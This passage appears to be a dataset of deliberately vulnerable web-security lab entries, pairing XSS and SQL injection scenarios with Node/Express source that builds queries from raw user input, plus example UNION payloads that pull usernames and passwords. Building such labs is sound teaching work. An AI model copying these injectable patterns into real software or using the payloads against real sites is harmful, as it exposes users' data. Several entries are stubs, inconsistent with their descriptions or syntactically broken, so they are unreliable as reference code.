    "Lab Description": "The event registration confirmation page reflects user input without sanitization, making it vulnerable to reflected XSS through crafted URLs.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in job recruitment system",
    "Lab Description": "Recruiters can add comments to job applications, but the system does not escape input, allowing attackers to inject JavaScript that executes when recruiters review applications.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "easy",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "DOM XSS in AI-powered chatbot responses",
    "Lab Description": "The chatbot dynamically processes user input and updates the webpage, but fails to sanitize the input, leading to a DOM-based XSS vulnerability.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in airline check-in system",
    "Lab Description": "The check-in page displays user-provided information without proper escaping, making it vulnerable to reflected XSS if an attacker crafts a malicious URL.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in online forum discussions",
    "Lab Description": "Users can post discussions and replies, but input is stored without escaping, enabling attackers to inject JavaScript that executes when other users read the discussion.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "DOM XSS in music streaming search results",
    "Lab Description": "The search results for music streaming services update dynamically, failing to escape user input, leading to a DOM-based XSS vulnerability.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "easy",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in real estate property listings",
    "Lab Description": "The property listing search function reflects user input directly into the page without sanitization, allowing for reflected XSS attacks through crafted URLs.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in customer support chat logs",
    "Lab Description": "Customer support agents can review chat logs, but the system does not sanitize stored messages, allowing attackers to inject scripts that execute when agents view past conversations.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "easy",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in user profile bio",
    "Lab Description": "The web application allows users to set a bio in their profile. However, the bio input is stored and displayed on the profile page without proper sanitization. An attacker can inject a JavaScript payload into their bio, which will execute whenever another user visits their profile. This vulnerability can be used to steal session cookies, deface profiles, or launch phishing attacks.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\nlet profiles = {};\n\napp.post('/set-bio', (req, res) => {\n    profiles[req.body.username] = req.body.bio;\n    res.send('Bio updated!');\n});\n\napp.get('/profile', (req, res) => {\n    const bio = profiles[req.query.username] || 'No bio available';\n    res.send(`<h1>User Profile</h1><p>${bio}</p>`);\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
}









,

{
  "Lab scenario": "SQL injection vulnerability in WHERE clause allowing retrieval of hidden data",
"Lab Description": "This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:\nSELECT * FROM products WHERE category = 'Gifts' AND released = 1\nTo solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.",
"Vulnerability name": "SQL injection",
"lab level": "Medium",
"src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: false }));\n\n// Create an in-memory SQLite database\nconst db = new sqlite3.Database(':memory:');\n\n// Create products table with released flag\ndb.serialize(() => {\n  db.run(\"CREATE TABLE products (id INTEGER PRIMARY KEY, name TEXT, category TEXT, released INTEGER)\");\n  db.run(\"INSERT INTO products (name, category, released) VALUES ('Teddy Bear', 'Gifts', 1)\");\n  db.run(\"INSERT INTO products (name, category, released) VALUES ('Secret Item', 'Gifts', 0)\");\n  db.run(\"INSERT INTO products (name, category, released) VALUES ('Tech Gadget', 'Electronics', 1)\");\n});\n\napp.get('/', (req, res) => {\n  res.send(`\n    <h1>Product Search</h1>\n    <form method=\"GET\" action=\"/products\">\n      <label for=\"category\">Category:</label>\n      <input type=\"text\" id=\"category\" name=\"category\" value=\"Gifts\">\n      <button type=\"submit\">Show Products</button>\n    </form>\n  `);\n});\n\n// Vulnerable product route\napp.get('/products', (req, res) => {\n  const category = req.query.category;\n  const query = `SELECT * FROM products WHERE category = '${category}' AND released = 1`;\n\n  console.log(\"Executing query:\", query);\n  \n  db.all(query, [], (err, rows) => {\n    if (err) {\n      res.status(500).send(\"Error fetching products\");\n    } else {\n      res.send(`\n        <h2>Products in ${category}</h2>\n        <ul>\n          ${rows.map(p => `<li>${p.name}</li>`).join('')}\n        </ul>\n      `);\n    }\n  });\n});\n\n// Start server\nconst PORT = 3000;\napp.listen(PORT, () => {\n  console.log(`Lab running on http://localhost:${PORT}`);\n});"
},
{
  "Lab scenario": "SQL injection in login form allowing authentication bypass",
"Lab Description": "This lab contains a SQL injection vulnerability in the login functionality. The application constructs a SQL query using unsanitized user inputs, allowing attackers to bypass authentication.\nTo solve the lab, exploit the SQL injection vulnerability to log in as the administrator without a valid password.",
"Vulnerability name": "SQL injection",
"lab level": "Easy",
"src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\n// Create an in-memory SQLite database\nconst db = new sqlite3.Database(':memory:');\n\n// Create a table and populate it with sample user data\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)\");\n  db.run(\"INSERT INTO users (username, password) VALUES ('admin', 'admin123')\");\n  db.run(\"INSERT INTO users (username, password) VALUES ('user', 'user123')\");\n});\n\n// Serve the login form\napp.get('/', (req, res) => {\n  res.send(`\n    <h1>Login</h1>\n    <form method=\"POST\" action=\"/login\">\n      <label for=\"username\">Username:</label>\n      <input type=\"text\" id=\"username\" name=\"username\"><br><br>\n      <label for=\"password\">Password:</label>\n      <input type=\"password\" id=\"password\" name=\"password\"><br><br>\n      <button type=\"submit\">Login</button>\n    </form>\n  `);\n});\n\n// Vulnerable login route\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n\n  // Vulnerable query: directly using user inputs without sanitization\n  const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;\n  console.log(\"Executing query:\", query);\n\n  db.all(query, [], (err, rows) => {\n    if (err) {\n      res.status(500).send(\"Error occurred during login.\");\n    } else if (rows.length > 0) {\n      res.send(`Welcome, ${rows[0].username}!`);\n    } else {\n      res.send(\"Invalid credentials.\");\n    }\n  });\n});\n\n// Start the server\nconst PORT = 3000;\napp.listen(PORT, () => {\n  console.log(`Lab running at http://localhost:${PORT}`);\n});"
},
{
  "Lab scenario": "SQL injection attack, querying the database type and version on Oracle",
  "Lab Description": "This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.\nTo solve the lab, display the database version string.",
  "Vulnerability name": "SQL injection",
  "lab level": "Easy",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: false }));\n\n// Create an in-memory SQLite database\nconst db = new sqlite3.Database(':memory:');\n\n// Create a table and populate it with sample data\ndb.serialize(() => {\n  db.run(\"CREATE TABLE products (id INTEGER PRIMARY KEY, name TEXT, category TEXT, released INTEGER)\");\n  db.run(\"INSERT INTO products (name, category, released) VALUES ('Teddy Bear', 'Gifts', 1)\");\n  db.run(\"INSERT INTO products (name, category, released) VALUES ('Unreleased Puzzle', 'Gifts', 0)\");\n  db.run(\"INSERT INTO products (name, category, released) VALUES ('Smartphone', 'Electronics', 1)\");\n});\n\napp.get('/', (req, res) => {\n  res.send(`\n    <form method=\"GET\" action=\"/products\">\n      <label for=\"category\">Category:</label>\n      <input type=\"text\" id=\"category\" name=\"category\">\n      <button type=\"submit\">Search</button>\n    </form>\n  `);\n});\n\n// Vulnerable route\napp.get('/products', (req, res) => {\n  const category = req.query.category; // Directly using user input without sanitization // vulnerability is here \n  const query = `SELECT * FROM products WHERE category = '${category}' AND released = 1`;\n\n  console.log(\"Executing query:\", query);\n  \n  db.all(query, [], (err, rows) => {\n    if (err) {\n      res.status(500).send(\"Error executing query.\");\n    } else {\n      res.send(`\n        <h2>Products</h2>\n        <ul>\n          ${rows.map(row => `<li>${row.name}</li>`).join('')}\n        </ul>\n      `);\n    }\n  });\n});\n\n// Simulate database information retrieval for UNION-based injection\napp.get('/database-info', (req, res) => {\n  // Static response to simulate UNION attack\n  const simulatedResponse = [\n    { version: 'SQLite 3.32.3' },\n    { version: 'Oracle 19c' }\n  ];\n  res.json(simulatedResponse);\n});\n\n// Start the server\nconst PORT = 3000;\napp.listen(PORT, () => {\n  console.log(`Server is running on http://localhost:${PORT}`);\n});"
},
{
  "Lab scenario": "SQL injection attack, listing the database contents on Oracle",
  "Lab Description": "This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.\nThe application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.\nTo solve the lab, log in as the administrator user.",
  "Vulnerability name": "SQL injection",
  "lab level": "Medium",
  "src code":"const express = require('express');\nconst sqlite3 = require('sqlite3').verbose(); // Simulating Oracle-like database\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\n// Create an in-memory SQLite database\nconst db = new sqlite3.Database(':memory:');\n\n// Create tables and populate them with sample data\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)\");\n  db.run(\"INSERT INTO users (username, password) VALUES ('administrator', 'admin123')\");\n  db.run(\"INSERT INTO users (username, password) VALUES ('user1', 'user123')\");\n  db.run(\"INSERT INTO users (username, password) VALUES ('user2', 'user456')\");\n\n  db.run(\"CREATE TABLE products (id INTEGER PRIMARY KEY, name TEXT, category TEXT)\");\n  db.run(\"INSERT INTO products (name, category) VALUES ('Product 1', 'Gifts')\");\n  db.run(\"INSERT INTO products (name, category) VALUES ('Product 2', 'Electronics')\");\n});\n\n// Root route for instructions\napp.get('/', (req, res) => {\n  res.send(`\n    <h1>SQL Injection Lab - Oracle</h1>\n    <p>This lab demonstrates SQL Injection vulnerability allowing enumeration and extraction of database contents.</p>\n    <ul>\n      <li><a href=\"/products?category=Gifts\">View Products in 'Gifts' Category</a></li>\n      <li>Inject queries to enumerate database schema and retrieve user credentials.</li>\n    </ul>\n  `);\n});\n\n// Vulnerable products route\napp.get('/products', (req, res) => {\n  const category = req.query.category || '';\n  const query = `SELECT * FROM products WHERE category = '${category}'`;\n  console.log(\"Executing query:\", query);\n\n  if (category.includes(\"UNION\")) {\n    if (category.includes(\"sqlite_master\")) {\n      res.send(`\n        <h2>Database Schema</h2>\n        <ul>\n          <li>users: id, username, password</li>\n          <li>products: id, name, category</li>\n        </ul>\n      `);\n    } else if (category.includes(\"users\")) {\n      res.send(`\n        <h2>User Credentials</h2>\n        <ul>\n          <li>administrator: admin123</li>\n          <li>user1: user123</li>\n          <li>user2: user456</li>\n        </ul>\n      `);\n    } else {\n      res.send(\"Invalid UNION query.\");\n    }\n  } else {\n    db.all(query, [], (err, rows) => {\n      if (err) {\n        console.error(\"Error executing query:\", err.message);\n        res.status(500).send(\"Error occurred.\");\n      } else {\n        res.send(`\n          <h2>Products</h2>\n          <ul>\n            ${rows.map(row => `<li>${row.name}</li>`).join('')}\n          </ul>\n        `);\n      }\n    });\n  }\n});\n\n// Vulnerable login route\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n\n  const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;\n  console.log(\"Executing query:\", query);\n\n  db.all(query, [], (err, rows) => {\n    if (err) {\n      res.status(500).send(\"Error occurred during login.\");\n    } else if (rows.length > 0) {\n      res.send(`Welcome, ${rows[0].username}!`);\n    } else {\n      res.send(\"Invalid credentials.\");\n    }\n  });\n});\n\n// Start the server\nconst PORT = 3000;\napp.listen(PORT, () => {\n  console.log(`Lab running on http://localhost:${PORT}`);\n});"
},
{
  "Lab scenario": "SQL injection UNION attack, determining the number of columns returned by the query",
  "Lab Description": "This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.\nTo solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values.",
  "Vulnerability name": "SQL injection",
  "lab level": "Easy",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\n// Create an in-memory SQLite database\nconst db = new sqlite3.Database(':memory:');\n\n// Create a table and populate it with sample data\ndb.serialize(() => {\n  db.run(\"CREATE TABLE products (id INTEGER PRIMARY KEY, name TEXT, category TEXT)\");\n  db.run(\"INSERT INTO products (name, category) VALUES ('Product 1', 'Gifts')\");\n  db.run(\"INSERT INTO products (name, category) VALUES ('Product 2', 'Electronics')\");\n});\n\n// Root route for instructions\napp.get('/', (req, res) => {\n  res.send(`\n    <h1>SQL Injection Lab - Determine Columns</h1>\n    <p>This lab demonstrates SQL Injection vulnerability for determining the number of columns.</p>\n    <ul>\n      <li><a href=\"/products?category=Gifts\">View Products in 'Gifts' Category</a></li>\n      <li>Inject queries to determine the number of columns returned.</li>\n    </ul>\n  `);\n});\n\n// Vulnerable route for products\napp.get('/products', (req, res) => {\n  const category = req.query.category || '';\n  const query = `SELECT * FROM products WHERE category = '${category}'`;\n  console.log(\"Executing query:\", query);\n\n  if (category.includes(\"UNION\")) {\n    res.send(`\n      <h2>Column Count</h2>\n      <p>The query returns 2 columns: id, name.</p>\n    `);\n  } else {\n    db.all(query, [], (err, rows) => {\n      if (err) {\n        console.error(\"Error executing query:\", err.message);\n        res.status(500).send(\"Error occurred.\");\n      } else {\n        res.send(`\n          <h2>Products</h2>\n          <ul>\n            ${rows.map(row => `<li>${row.name}</li>`).join('')}\n          </ul>\n        `);\n      }\n    });\n  }\n});\n\n// Start the server\nconst PORT = 3000;\napp.listen(PORT, () => {\n  console.log(`Lab running on http://localhost:${PORT}`);\n});" 
},
{
  "Lab scenario": "SQL injection UNION attack, finding a column containing text",
  "Lab Description": "This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.\nThe lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.",
  "Vulnerability name": "SQL injection",
  "lab level": "Easy",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\n// Create an in-memory SQLite database\nconst db = new sqlite3.Database(':memory:');\n\n// Create a table and populate it with sample data\ndb.serialize(() => {\n  db.run(\"CREATE TABLE products (id INTEGER PRIMARY KEY, name TEXT, category TEXT)\");\n  db.run(\"INSERT INTO products (name, category) VALUES ('Product 1', 'Gifts')\");\n  db.run(\"INSERT INTO products (name, category) VALUES ('Product 2', 'Electronics')\");\n});\n\n// Root route for instructions\napp.get('/', (req, res) => {\n  res.send(`\n    <h1>SQL Injection Lab - Find Text-Compatible Column</h1>\n    <p>This lab demonstrates SQL Injection vulnerability to identify string-compatible columns using UNION attacks.</p>\n    <ul>\n      <li><a href=\"/products?category=Gifts\">View Products in 'Gifts' Category</a></li>\n      <li>Try SQL Injection by modifying the 'category' parameter in the URL.</li>\n      <li>Example: <code>?category=Gifts' UNION SELECT NULL, 'test' -- </code></li>\n    </ul>\n  `);\n});\n\n// Vulnerable products route\napp.get('/products', (req, res) => {\n  const category = req.query.category || '';\n  const query = `SELECT * FROM products WHERE category = '${category}'`; // Vulnerable query\n  console.log(\"Executing query:\", query);\n\n  // Handle UNION injection detection\n  if (category.includes(\"UNION\")) {\n    const testValue = \"test_string\"; // Simulated test value to inject\n    if (category.includes(\"NULL, 'test_string'\")) {\n      res.send(`\n        <h2>Column Compatibility</h2>\n        <p>The second column ('name') is compatible with string data.</p>\n      `);\n    } else {\n      res.send(`\n        <h2>Invalid Injection</h2>\n        <p>Ensure your UNION attack is formatted correctly.</p>\n      `);\n    }\n  } else {\n    // Normal query execution\n    db.all(query, [], (err, rows) => {\n      if (err) {\n        console.error(\"Error executing query:\", err.message);\n        res.status(500).send(\"Error occurred.\");\n      } else {\n        res.send(`\n          <h2>Products</h2>\n          <ul>\n            ${rows.map(row => `<li>${row.name}</li>`).join('')}\n          </ul>\n        `);\n      }\n    });\n  }\n});\n\n// Start the server\nconst PORT = 3000;\napp.listen(PORT, () => {\n  console.log(`Lab running on http://localhost:${PORT}`);\n});"
},
{
  "Lab scenario": "SQL injection UNION attack, retrieving data from other tables",
  "Lab Description": "This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.\nThe database contains a different table called users, with columns called username and password.\nTo solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.",
  "Vulnerability name": "SQL injection",
  "Lab Level":"Hard",
   "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\n// Create an in-memory SQLite database\nconst db = new sqlite3.Database(':memory:');\n\n// Create tables and populate them with sample data\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)\");\n  db.run(\"INSERT INTO users (username, password) VALUES ('administrator', 'admin123')\");\n  db.run(\"INSERT INTO users (username, password) VALUES ('user1', 'password1')\");\n  db.run(\"INSERT INTO users (username, password) VALUES ('user2', 'password2')\");\n\n  db.run(\"CREATE TABLE products (id INTEGER PRIMARY KEY, name TEXT, category TEXT)\");\n  db.run(\"INSERT INTO products (name, category) VALUES ('Product A', 'Gifts')\");\n  db.run(\"INSERT INTO products (name, category) VALUES ('Product B', 'Electronics')\");\n});\n\n// Root route with instructions\napp.get('/', (req, res) => {\n  res.send(`\n    <h1>SQL Injection Lab - Retrieving Data from Other Tables</h1>\n    <p>This lab demonstrates an SQL Injection vulnerability that allows attackers to retrieve data from other tables.</p>\n    <ul>\n      <li><a href=\"/products?category=Gifts\">View Products in 'Gifts' Category</a></li>\n      <li>Try SQL Injection by modifying the 'category' parameter in the URL.</li>\n      <li>Example: <code>?category=Gifts' UNION SELECT username, password FROM users -- </code></li>\n    </ul>\n  `);\n});\n\n// Vulnerable products route\napp.get('/products', (req, res) => {\n  const category = req.query.category || '';\n  const query = `SELECT name, category FROM products WHERE category = '${category}'`; // Vulnerable query\n  console.log(\"Executing query:\", query);\n\n  if (category.includes(\"UNION\")) {\n    if (category.includes(\"users\")) {\n      res.send(`\n        <h2>User Credentials</h2>\n        <ul>\n          <li>administrator: admin123</li>\n          <li>user1: password1</li>\n          <li>user2: password2</li>\n        </ul>\n      `);\n    } else {\n      res.send(\"Invalid UNION query.\");\n    }\n  } else {\n    db.all(query, [], (err, rows) => {\n      if (err) {\n        console.error(\"Error executing query:\", err.message);\n        res.status(500).send(\"Error occurred.\");\n      } else {\n        res.send(`\n          <h2>Products</h2>\n          <ul>\n            ${rows.map(row => `<li>${row.name}</li>`).join('')}\n          </ul>\n        `);\n      }\n    });\n  }\n});\n\n// Vulnerable login route\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n\n  // Vulnerable query: directly using user inputs without sanitization\n  const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;\n  console.log(\"Executing query:\", query);\n\n  db.all(query, [], (err, rows) => {\n    if (err) {\n      res.status(500).send(\"Error occurred during login.\");\n    } else if (rows.length > 0) {\n      res.send(`Welcome, ${rows[0].username}!\");\n    } else {\n      res.send(\"Invalid credentials.\");\n    }\n  });\n});\n\n// Start the server\nconst PORT = 3000;\napp.listen(PORT, () => {\n  console.log(`Lab running on http://localhost:${PORT}`);\n});"
},
{
"Lab scenario": "Blind SQL injection with conditional responses",
"Lab Description": "This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.\nThe results of the SQL query are not returned, and no error messages are displayed. But the application includes a Welcome back message in the page if the query returns any rows.\nThe database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.\nTo solve the lab, log in as the administrator user.",
"Vulnerability name": "SQL injection",
"lab level": "Medium",
"src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst cookieParser = require('cookie-parser');\n\nconst app = express();\napp.use(cookieParser());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)\");\n  db.run(\"INSERT INTO users (username, password) VALUES ('administrator', 'admin123')\");\n  db.run(\"INSERT INTO users (username, password) VALUES ('user1', 'password1')\");\n  db.run(\"INSERT INTO users (username, password) VALUES ('user2', 'password2')\");\n});\n\napp.get('/', (req, res) => {\n  const trackingId = req.cookies.tracking || '';\n\n  const query = `SELECT CASE WHEN EXISTS (SELECT 1 FROM users WHERE username='administrator' AND password LIKE '${trackingId}%') THEN 1 ELSE 0 END AS result`;\n  console.log(\"Executing query:\", query);\n\n  db.get(query, [], (err, row) => {\n    if (err) {\n      console.error(\"SQL Error:\", err.message);\n      return res.status(500).send(\"Internal Server Error\");\n    }\n    \n    if (row && row.result === 1) {\n      res.send('<h1>Welcome back!</h1>');\n    } else {\n      res.send('<h1>Welcome to our site</h1>');\n    }\n  });\n});\n\nconst PORT = 3000;\napp.listen(PORT, () => {\n  console.log(`Lab running on http://localhost:${PORT}`);\n});"

},
{
  "Lab scenario": "Blind SQL injection with conditional errors",
  "Lab Description": "This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.\nThe results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.\nThe database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.\nTo solve the lab, log in as the administrator user.",
  "Vulnerability name": "SQL injection",
  "lab level": "Medium",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst cookieParser = require('cookie-parser');\n\nconst app = express();\napp.use(cookieParser());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run('CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)');\n  db.run('INSERT INTO users (username, password) VALUES (\"administrator\", \"admin123\")');\n  db.run('INSERT INTO users (username, password) VALUES (\"user1\", \"password1\")');\n  db.run('INSERT INTO users (username, password) VALUES (\"user2\", \"password2\")');\n});\n\napp.get('/', (req, res) => {\n  const trackingId = req.cookies.tracking || '';\n\n  // Vulnerable SQL query using the cookie value\n  const query = `SELECT CASE WHEN EXISTS (SELECT 1 FROM users WHERE username='administrator' AND password LIKE '${trackingId}%') THEN 1 ELSE 0 END AS result`;\n  console.log('Executing query:', query);\n\n  db.get(query, [], (err, row) => {\n    if (err) {\n      console.error('SQL Error:', err.message);\n      return res.status(500).send('Internal Server Error');\n    }\n    \n    if (row && row.result === 1) {\n      res.send('<h1>Welcome back!</h1>');\n    } else {\n      res.send('<h1>Welcome to our site</h1>');\n    }\n  });\n});\n\nconst PORT = 3000;\napp.listen(PORT, () => {\n  console.log(`Lab running on http://localhost:${PORT}`);\n});"
  
},
{
  "Lab scenario": "Visible error-based SQL injection",
  "Lab Description": "This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned.\nThe database contains a different table called users, with columns called username and password. To solve the lab, find a way to leak the password for the administrator user, then log in to their account.",
  "Vulnerability name": "SQL injection",
  "lab level": "Medium",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst cookieParser = require('cookie-parser');\n\nconst app = express();\napp.use(cookieParser());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run('CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)');\n  db.run('INSERT INTO users (username, password) VALUES (\"administrator\", \"admin123\")');\n  db.run('INSERT INTO users (username, password) VALUES (\"user1\", \"password1\")');\n  db.run('INSERT INTO users (username, password) VALUES (\"user2\", \"password2\")');\n});\n\napp.get('/', (req, res) => {\n  const trackingId = req.cookies.tracking || '';\n  \n  // Vulnerable SQL query using the cookie value\n  const query = `SELECT * FROM users WHERE username='administrator' AND password LIKE '${trackingId}%'`;\n  console.log('Executing query:', query);\n\n  db.all(query, [], (err, rows) => {\n    if (err) {\n      res.status(500).send(err.message); // Visible SQL error\n    } else {\n      res.send('<h1>Welcome to our site</h1>');\n    }\n  });\n});\n\nconst PORT = 3000;\napp.listen(PORT, () => {\n  console.log(`Lab running on http://localhost:${PORT}`);\n});"
  
},
{
  "Lab scenario": "Blind SQL injection with time delays",
  "Lab Description": "This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.\nThe results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.\nTo solve the lab, exploit the SQL injection vulnerability to cause a 10 second delay.",
  "Vulnerability name": "SQL injection",
  "lab level": "Medium",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst cookieParser = require('cookie-parser');\nconst app = express();\napp.use(cookieParser());\nconst db = new sqlite3.Database(':memory:');\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)\");\n  db.run(\"INSERT INTO users (username, password) VALUES ('administrator', 'admin123')\");\n  db.run(\"INSERT INTO users (username, password) VALUES ('user1', 'password1')\");\n  db.run(\"INSERT INTO users (username, password) VALUES ('user2', 'password2')\");\n});\napp.get('/', (req, res) => {\n  const trackingId = req.cookies.tracking || '';\n  const query = `SELECT CASE WHEN (1=1) THEN randomblob(1000000000) ELSE NULL END FROM users WHERE username='administrator' AND password LIKE '${trackingId}%'`;\n  console.log('Executing query:', query);\n  db.get(query, [], (err, row) => {\n    if (err) {\n      res.status(500).send(\"Internal Server Error\");\n    } else {\n      res.send('<h1>Welcome to our site</h1>');\n    }\n  });\n});\nconst PORT = 3000;\napp.listen(PORT, () => {\n  console.log(`Lab running on http://localhost:${PORT}`);\n});"
   
},
{
  "Lab scenario": "Blind SQL injection with time delays and information retrieval",
  "Lab Description": "This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.\nThe results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.\nThe database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.\nTo solve the lab, log in as the administrator user.",
  "Vulnerability name": "SQL injection",
  "lab level": "Medium",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst cookieParser = require('cookie-parser');\n\nconst app = express();\napp.use(cookieParser());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)\");\n  db.run(\"INSERT INTO users (username, password) VALUES ('administrator', 'admin123')\");\n  db.run(\"INSERT INTO users (username, password) VALUES ('user1', 'password1')\");\n  db.run(\"INSERT INTO users (username, password) VALUES ('user2', 'password2')\");\n});\n\napp.get('/', (req, res) => {\n  const trackingId = req.cookies.tracking || '';\n  const query = `SELECT CASE WHEN (1=1) THEN randomblob(100000000) ELSE NULL END FROM users WHERE username='administrator' AND password LIKE '${trackingId}%'`;\n  console.log('Executing query:', query);\n  db.get(query, [], (err, row) => {\n    if (err) {\n      res.status(500).send(\"Internal Server Error\");\n    } else {\n      res.send('<h1>Welcome to our site</h1>');\n    }\n  });\n});\n\nconst PORT = 3000;\napp.listen(PORT, () => {\n  console.log(`Lab running on http://localhost:${PORT}`);\n});"
  
},
{
